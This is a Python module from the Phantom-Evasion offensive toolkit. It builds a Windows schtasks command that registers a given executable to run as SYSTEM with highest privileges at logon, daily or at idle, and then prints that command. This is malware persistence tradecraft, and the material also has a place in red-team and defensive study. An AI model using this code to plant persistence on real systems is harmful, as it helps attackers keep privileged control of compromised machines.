
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import random, string
import sys 
sys.path.append("Modules/payloads/auxiliar")
import usefull

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def Enter2Continue():
    try:   
        ans=input("\n[>] Press Enter to continue") 
    except SyntaxError:
        pass

    pass


FilePath = sys.argv[1]

TaskName = sys.argv[2]

TypePersistence = sys.argv[3]

TimeVar = sys.argv[4]

cmdline = ""




if TypePersistence == "1":        #Startup/System

    if TimeVar == "No":
        
        cmdline += "schtasks /create /tn " + TaskName + " /sc ONLOGON /rl highest /ru system /F /tr \"" + FilePath + "\""

    else:

        cmdline += "schtasks /create /tn " + TaskName + " /sc ONLOGON /delay " + TimeVar + " /rl highest /ru system /F /tr \"" + FilePath + "\""   


if TypePersistence == "2":        #Dailytime/System 

    cmdline += "schtasks /create /tn " + TaskName + " /sc DAILY /ST" + TimeVar + " /rl highest /ru system /F /tr \"" + FilePath + "\""


if TypePersistence == "3":        #Idletime/System

    cmdline += "schtasks /create /tn " + TaskName + " /sc ONIDLE /I " + TimeVar + " /rl highest /ru system /F /tr \"" + FilePath + "\""




print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Admin Priv: " + bcolors.ENDC + bcolors.ENDC + bcolors.RED + "Required" + bcolors.ENDC)
print("\n" + bcolors.OCRA + bcolors.BOLD + "[>] Persistence Cmdline: " + bcolors.ENDC + bcolors.ENDC + cmdline)

Enter2Continue()



